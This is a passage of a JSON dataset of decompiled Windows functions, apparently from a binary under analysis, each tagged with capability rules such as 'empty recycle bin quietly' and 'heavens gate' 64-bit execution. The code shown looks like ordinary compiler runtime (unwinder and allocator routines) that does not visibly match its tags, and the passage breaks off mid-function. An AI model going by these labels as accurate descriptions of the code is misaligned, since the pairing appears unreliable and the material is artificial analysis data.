        "decompiled_code": "\nulong __fastcall fcn.0043a8e0(uint param_1, uint param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint auStack284 [32];\n    uint auStack156 [18];\n    uint uStack84;\n    uint uStack80;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack24 = in_EAX;\n    uStack20 = param_2;\n    fcn.00439e90();\n    puVar4 = auStack284;\n    puVar5 = auStack156;\n    for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    if (*(param_3 + 0xc) == 0) {\n        iVar3 = fcn.0043a0f0();\n    }\n    else {\n        iVar3 = fcn.0043a1c0();\n    }\n    if (iVar3 == 7) {\n        fcn.0043a2f0();\n        uVar6 = fcn.0043a6d0(uStack84, uStack80);\n        *(&stack0x00000000 + uVar6) = uVar6 >> 0x20;\n        return CONCAT44(uStack20, uStack24);\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar2 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x52e0f8, 0x56b01c);\n    }\n    uVar6 = fcn.004014c0(fcn.00401590);\n    return uVar6;\n}\n",
        "token_count": 630
    },
    "0043a980": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043a980(uint param_1, uint param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    int32_t extraout_EDX;\n    uint *puVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint auStack284 [32];\n    uint auStack156 [18];\n    uint uStack84;\n    uint uStack80;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = param_2;\n    if (*(param_3 + 0xc) == 0) {\n        uVar6 = fcn.0043a6e0(param_3);\n        return uVar6;\n    }\n    uStack24 = in_EAX;\n    fcn.00439e90();\n    puVar4 = auStack284;\n    puVar5 = auStack156;\n    for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = fcn.0043a1c0();\n    if (iVar3 == 7) {\n        fcn.0043a2f0();\n        fcn.0043a6d0(uStack84, uStack80);\n        *(&stack0x00000000 + extraout_EDX) = uStack80;\n        return CONCAT44(uStack20, uStack24);\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar2 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x52e0f8, 0x56b01c);\n    }\n    uVar6 = fcn.004014c0(fcn.00401590);\n    return uVar6;\n}\n",
        "token_count": 626
    },
    "004483d0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint32_t ** fcn.004483d0(void)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    uint32_t **ppuVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t **ppuVar5;\n    uint32_t **ppuVar6;\n    uint32_t uVar7;\n    uint32_t **ppuVar8;\n    uint32_t *unaff_EDI;\n    ulong uVar9;\n    \n    if (*0x515a34 == 0) {\n        uVar7 = in_EAX + 0x10;\n        if (uVar7 < 8) {\n            uVar7 = 8;\n        }\n        if (*0x515d20 != NULL) {\ncode_r0x00448408:\n            ppuVar5 = uVar7 + 0xf & 0xfffffff0;\n            ppuVar8 = **0x515d20;\n            ppuVar2 = *0x515d20;\n            if (ppuVar8 < ppuVar5) {\n                do {\n                    ppuVar6 = ppuVar2;\n                    ppuVar2 = ppuVar6[1];\n                    if (ppuVar2 == NULL) goto code_r0x00448422;\n                    ppuVar8 = *ppuVar2;\n                } while (ppuVar8 < ppuVar5);\n                ppuVar6 = ppuVar6 + 1;\n            }\n            else {\n                ppuVar6 = 0x515d20;\n            }\n            uVar9 = CONCAT44(ppuVar6, ppuVar2);\n            unaff_EDI = ppuVar2[1];\n            if (ppuVar8 - ppuVar5 < 8) goto code_r0x00448480;\n            puVar1 = ppuVar2 + ppuVar5;\n            puVar1[1] = unaff_EDI;\n            ppuVar2 = *ppuVar6;\n            *puVar1 = ppuVar8 - ppuVar5;\n            *ppuVar2 = ppuVar5;\n            *ppuVar6 = puVar1;\n            goto code_r0x0044845d;\n        }\n        ppuVar8 = NULL;\n    }\n    else {\n        iVar3 = fcn.004382e0(0x515d18);\n        if (iVar3 != 0) {\n            uVar9 = fcn.00449d10();\n            if (uVar9 >> 0x20 == -1) {\n                fcn.004c2f10(uVar9);\n            }\n            fcn.0043a8e0();\n            if (*0x515a34 != 0) {\n                fcn.00438280(0x515d18);\n            }\n            *0x515d28 = 0x4a00;\n            puVar4 = sub.msvcrt.dll_malloc(0x4a00);\n            *0x515d24 = puVar4;\n            if (puVar4 == NULL) {\n                *0x515d28 = 0;\n                *0x515d20 = NULL;\n            }\n            else {\n                *0x515d20 = puVar4;\n                *puVar4 = 0x4a00;\n                puVar4[1] = 0;\n            }\n            ppuVar8 = fcn.004014c0(0x4c3b60);\n            return ppuVar8;\n        }\n        uVar7 = in_EAX + 0x10;\n        if (uVar7 < 8) {\n            uVar7 = 8;\n        }\n        if (*0x515d20 != NULL) goto code_r0x00448408;\ncode_r0x00448422:\n        ppuVar8 = NULL;\n        while ((*0x515a34 != 0 && (iVar3 = fcn.00438340(0x515d18),  iVar3 != 0))) {\n            uVar9 = fcn.00449d40();\ncode_r0x00448480:\n            ppuVar2 = uVar9;\n            *ppuVar2 = ppuVar8;\n            *(uVar9 >> 0x20) = unaff_EDI;\ncode_r0x0044845d:\n            ppuVar8 = ppuVar2 + 4;\n        }\n    }\n    return ppuVar8;\n}\n",
        "token_count": 970
    },
    "004386b0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004386b0(int32_t param_1, uint8_t *param_2, uint *param_3)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint8_t *in_EAX;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint8_t uVar7;\n    uint8_t uVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    uint *puVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint *puVar14;\n    uint *var_8h;\n    uint uStack64;\n    uint *var_38h;\n    int32_t var_34h;\n    uint8_t *var_30h;\n    int32_t var_2ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    var_8h[0x24] = 0;\n    if (in_EAX < param_2) {\n        var_2ch = *(param_1 + 0x60);\n        uVar13 = var_8h[0x29];\n        if (uVar13 < *(param_1 + 0x4c) - (var_2ch >> 0x1f)) {\n            var_38h = NULL;\n            var_34h = param_1;\n            var_30h = param_2;\n            do {\n                uVar5 = *in_EAX;\n                puVar10 = in_EAX + 1;\n                uVar7 = *in_EAX & 0xc0;\n                if (uVar7 == 0x40) {\n                    var_8h[0x29] = (uVar5 & 0x3f) * var_8h[0x2c] + uVar13;\n                    goto code_r0x00438722;\n                }\n                if (uVar7 == 0x80) {\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    iVar3 = var_8h[0x2b];\n                    if ((uVar5 & 0x3f) < 0x12) {\n                        (var_8h + (uVar5 & 0x3f) * 2)[1] = 1;\n                        var_8h[(uVar5 & 0x3f) * 2] = uVar13 * iVar3;\n                    }\n                    goto code_r0x00438722;\n                }\n                if (uVar7 == 0xc0) {\n                    if ((uVar5 & 0x3f) < 0x12) {\n                        var_8h[(uVar5 & 0x3f) * 2 + 1] = 0;\n                    }\n                    goto code_r0x00438722;\n                }\n    // switch table (48 cases) at 0x526cf0\n                switch(uVar5) {\n                case 0:\n                case 0x2d:\n                    break;\n                case 1:\n                    fcn.00438670();\n                    puVar10 = fcn.00438530(&var_1ch);\n                    var_8h[0x29] = var_1ch;\n                    break;\n                case 2:\n                    puVar10 = in_EAX + 2;\n                    var_8h[0x29] = in_EAX[1] * var_8h[0x2c] + uVar13;\n                    break;\n                case 3:\n                    puVar10 = in_EAX + 3;\n                    var_8h[0x29] = *(in_EAX + 1) * var_8h[0x2c] + uVar13;\n                    break;\n                case 4:\n                    puVar10 = in_EAX + 5;\n                    var_8h[0x29] = var_8h[0x2c] * *(in_EAX + 1) + uVar13;\n                    break;\n                case 5:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar12 = uVar12 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    goto code_r0x004388e7;\n                case 6:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    goto code_r0x0043892b;\n                case 7:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2 + 1] = 6;\n                    }\n                    break;\n                case 8:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\ncode_r0x0043892b:\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2 + 1] = 0;\n                    }\n                    break;\n                case 9:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar5 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar5 = uVar5 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        (var_8h + uVar13 * 2)[1] = 2;\n                        var_8h[uVar13 * 2] = uVar5;\n                    }\n                    break;\n                case 10:\n                    if (var_38h == NULL) {\n                        fcn.00437ed0();\n                        puVar6 = &uStack64;\n                    }\n                    else {\n                        puVar6 = var_38h;\n                        var_38h = var_38h[0x24];\n                    }\n                    puVar11 = var_8h;\n                    puVar14 = puVar6;\n                    for (iVar3 = 0x29; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar14 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar14 = puVar14 + 1;\n                    }\n                    var_8h[0x24] = puVar6;\n                    break;\n                case 0xb:\n                    puVar6 = var_8h[0x24];\n                    puVar11 = puVar6;\n                    puVar14 = var_8h;\n                    for (iVar3 = 0x29; iVar3 != 0; iVar3 = iVar3 + -1) {\n                        *puVar14 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                        puVar14 = puVar14 + 1;\n                    }\n                    puVar6[0x24] = var_38h;\n                    var_38h = puVar6;\n                    break;\n                case 0xc:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar7 = 0;\n                    var_8h[0x26] = uVar13;\n                    uVar13 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    var_8h[0x25] = uVar13;\n                    var_8h[0x28] = 1;\n                    break;\n                case 0xd:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    var_8h[0x26] = uVar13;\n                    var_8h[0x28] = 1;\n                    break;\n                case 0xe:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    var_8h[0x25] = uVar13;\n                    break;\n                case 0xf:\n                    uVar7 = 0;\n                    var_8h[0x27] = puVar10;\n                    var_8h[0x28] = 2;\n                    uVar13 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    puVar10 = puVar9 + uVar13;\n                    break;\n                case 0x10:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        (var_8h + uVar13 * 2)[1] = 0x3;\n                        var_8h[uVar13 * 2] = puVar9;\n                    }\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    puVar10 = puVar10 + uVar13;\n                    break;\n                case 0x11:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar5 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar5;\n                        uVar5 = uVar5 + 7;\n                        uVar12 = uVar12 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar5 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar12 = uVar12 | -(1 << (uVar5 & 0x1f));\n                    }\ncode_r0x004388e7:\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2] = uVar12 * var_8h[0x2b];\n                        (var_8h + uVar13 * 2)[1] = 1;\n                    }\n                    break;\n                case 0x12:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar5 = 0;\n                    var_8h[0x26] = uVar13;\n                    uVar13 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar5;\n                        uVar5 = uVar5 + 7;\n                        uVar13 = uVar13 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar5 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar13 = uVar13 | -(1 << (uVar5 & 0x1f));\n                    }\n                    var_8h[0x28] = 1;\n                    var_8h[0x25] = uVar13 * var_8h[0x2b];\n                    break;\n                case 0x13:\n                    uVar5 = 0;\n                    uVar13 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar13;\n                        uVar13 = uVar13 + 7;\n                        uVar5 = uVar5 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar13 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar5 = uVar5 | -(1 << (uVar13 & 0x1f));\n                    }\n                    var_8h[0x25] = uVar5 * var_8h[0x2b];\n                    break;\n                case 0x14:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar12 = uVar12 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    goto code_r0x00438d37;\n                case 0x15:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar12 = 0;\n                    uVar5 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar7 = *puVar9;\n                        uVar8 = uVar5;\n                        uVar5 = uVar5 + 7;\n                        uVar12 = uVar12 | (uVar7 & 0x7f) << (uVar8 & 0x1f);\n                        puVar9 = puVar10;\n                    } while (uVar7 < '\\0');\n                    if ((uVar5 < 0x20) && ((uVar7 & 0x40) != 0)) {\n                        uVar12 = uVar12 | -(1 << (uVar5 & 0x1f));\n                    }\ncode_r0x00438d37:\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2] = uVar12 * var_8h[0x2b];\n                        (var_8h + uVar13 * 2)[1] = 4;\n                    }\n                    break;\n                case 0x16:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        (var_8h + uVar13 * 2)[1] = 0x5;\n                        var_8h[uVar13 * 2] = puVar9;\n                    }\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    puVar10 = puVar10 + uVar13;\n                    break;\n                default:\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    sub.msvcrt.dll_abort();\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n                    if (iVar3 == 0) {\n                        *0x4ce004 = 0x43c000;\n                        pcVar4 = 0x43bdb0;\n                    }\n                    else {\n                        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n                        *0x4ce004 = (*pcVar2)(iVar3, \"__deregister_frame_info\");\n                    }\n                    if (pcVar4 != NULL) {\n                        (*pcVar4)(0x52e0f8, 0x56b01c);\n                    }\n                    fcn.004014c0(fcn.00401590);\n                    return;\n                case 0x2e:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    puVar9 = puVar10;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    *(var_34h + 0x68) = uVar13;\n                    break;\n                case 0x2f:\n                    uVar13 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar9 = puVar10 + 1;\n                        uVar8 = *puVar10;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar13 = uVar13 | (uVar8 & 0x7f) << uVar1;\n                        puVar10 = puVar9;\n                    } while (uVar8 < '\\0');\n                    uVar5 = 0;\n                    uVar7 = 0;\n                    do {\n                        puVar10 = puVar9 + 1;\n                        uVar8 = *puVar9;\n                        uVar1 = uVar7 & 0x1f;\n                        uVar7 = uVar7 + 7;\n                        uVar5 = uVar5 | (uVar8 & 0x7f) << uVar1;\n                        puVar9 = puVar10;\n                    } while (uVar8 < '\\0');\n                    if (uVar13 < 0x12) {\n                        var_8h[uVar13 * 2] = -(uVar5 * var_8h[0x2b]);\n                        (var_8h + uVar13 * 2)[1] = 1;\n                    }\n                }\ncode_r0x00438722:\n                if (var_30h <= puVar10) {\n                    return;\n                }\n                uVar13 = var_8h[0x29];\n                var_2ch = *(var_34h + 0x60);\n                in_EAX = puVar10;\n            } while (uVar13 < *(var_34h + 0x4c) - (var_2ch >> 0x1f));\n        }\n    }\n    return;\n}\n",
        "token_count": 6081
    },
    "00439530": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00439530(int32_t param_1, uint8_t *param_2, int32_t *param_3)\n\n{\n    int32_t **ppiVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    uint8_t *in_EAX;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint *puVar9;\n    uint8_t uVar10;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    uint8_t extraout_DL;\n    uint8_t *puVar13;\n    int32_t **unaff_EBP;\n    int32_t **unaff_EDI;\n    uint32_t uVar14;\n    int32_t **ppiStack312;\n    int32_t *piStack292;\n    int32_t **ppiStack288;\n    int32_t *apiStack284 [67];\n    \n    apiStack284[0] = param_3;\n    if (in_EAX < param_2) {\n        ppiStack312 = 0x1;\n        do {\n            uVar10 = *in_EAX;\n            uVar7 = uVar10;\n            puVar8 = in_EAX + 1;\n    // switch table (239 cases) at 0x526db0\n            switch(uVar7 - 3 & 0xff) {\n            case 0:\n            case 9:\n            case 10:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 5;\n                break;\n            default:\ncode_r0x00439a29:\n                do {\n                    sub.msvcrt.dll_abort();\n                    uVar10 = extraout_DL;\ncode_r0x00439a30:\n                    ppiStack312 = unaff_EBP;\n                    if (uVar10 == 6) {\n                        unaff_EDI = *unaff_EDI;\n                        goto code_r0x00439590;\n                    }\n                } while (uVar10 != 0x19);\n                unaff_EDI = (unaff_EDI ^ unaff_EDI >> 0x1f) - (unaff_EDI >> 0x1f);\n                break;\n            case 3:\n            case 0x16:\n            case 0x1c:\n            case 0x1d:\n            case 0x20:\n            case 0x91:\n                if (ppiStack312 == NULL) goto code_r0x004014e0;\n                unaff_EBP = ppiStack312 + -1;\n                unaff_EDI = apiStack284[unaff_EBP];\n                ppiStack312 = unaff_EBP;\n                if (uVar10 == 0x1f) {\n                    unaff_EDI = -unaff_EDI;\n                }\n                else {\n                    if (uVar10 < 0x20) goto code_r0x00439a30;\n                    if (uVar10 == 0x23) {\n                        uVar7 = 0;\n                        uVar10 = 0;\n                        puVar13 = puVar8;\n                        do {\n                            puVar8 = puVar13 + 1;\n                            uVar11 = *puVar13;\n                            uVar2 = uVar10 & 0x1f;\n                            uVar10 = uVar10 + 7;\n                            uVar7 = uVar7 | (uVar11 & 0x7f) << uVar2;\n                            puVar13 = puVar8;\n                        } while (uVar11 < '\\0');\n                        unaff_EDI = unaff_EDI + uVar7;\n                    }\n                    else if (uVar10 == 0x94) {\n                        uVar10 = in_EAX[1];\n                        puVar13 = in_EAX + 2;\n                        if (uVar10 == 2) {\n                            unaff_EDI = *unaff_EDI;\n                            puVar8 = puVar13;\n                        }\n                        else if (uVar10 < 3) {\n                            if (uVar10 != 1) goto code_r0x00439a29;\n                            unaff_EDI = *unaff_EDI;\n                            puVar8 = puVar13;\n                        }\n                        else {\n                            if ((uVar10 != 4) && (uVar10 != 8)) goto code_r0x00439a29;\n                            unaff_EDI = *unaff_EDI;\n                            puVar8 = puVar13;\n                        }\n                    }\n                    else {\n                        if (uVar10 != 0x20) goto code_r0x00439a29;\n                        unaff_EDI = ~unaff_EDI;\n                    }\n                }\n                break;\n            case 5:\n                unaff_EDI = in_EAX[1];\n                puVar8 = in_EAX + 2;\n                break;\n            case 6:\n                unaff_EDI = in_EAX[1];\n                puVar8 = in_EAX + 2;\n                break;\n            case 7:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 3;\n                break;\n            case 